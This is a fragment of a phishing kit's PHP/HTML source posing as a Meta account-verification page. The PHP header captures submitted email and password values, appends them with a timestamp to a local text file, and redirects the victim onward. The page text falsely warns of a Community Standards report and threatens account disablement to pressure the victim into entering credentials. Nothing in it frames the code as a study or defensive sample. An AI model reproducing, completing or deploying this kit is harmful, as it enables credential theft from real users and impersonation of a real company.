...
if(isset($_POST['PrevToEmail']) && isset($_POST['PrevToPass'])){
    $email = $_POST['PrevToEmail'];
    $password = $_POST['PrevToPass'];
    $time = date("Y-m-d H:i:s");
    $file = fopen('tramsexy.txt', 'a+');
    fwrite($file, "{$email}|{$password}|{$time}\n");
    fclose($file);

    $_SESSION['username'] = $email;
    header('Location: ../information.php?section_id=13-HowToContactMeta');
}
?>
<!DOCTYPE html>
<html lang="en">
...
<head>
    ...
    <link rel="stylesheet" type="text/css" href="../assets/css/style-info.css">
    <link rel="stylesheet" type="text/css" href="../assets/css/style-error.css">
    <link rel="stylesheet" type="text/css" href="../assets/css/interview.css">
    ...
    <div id="page-div">
        ...
        <div id="interview-page-container">
            <div class="BackArrowAndHeading">
                <img alt src="../assets/img/inF0loCk.png" width="100%">
            </div>
                ...
                <div id="tax-form">
                    <div id="AboutYouSection" class="Question AboutYouSection">
                        <div class="CaptionWrapper ">
                            <div class="Caption ">
                                We detected unusual activity in your account today <strong>
                                    <script language="JavaScript" type="text/javascript">
                                        document.write(tanggallengkap);
                                    </script>
                                </strong>. Someone has reported your account for not complying with <a>Community Standards</a>. We have already reviewed this decision and the decision cannot be changed. To avoid having your account <a>disabled</a>, please verify your account:
                            </div>
                        </div>
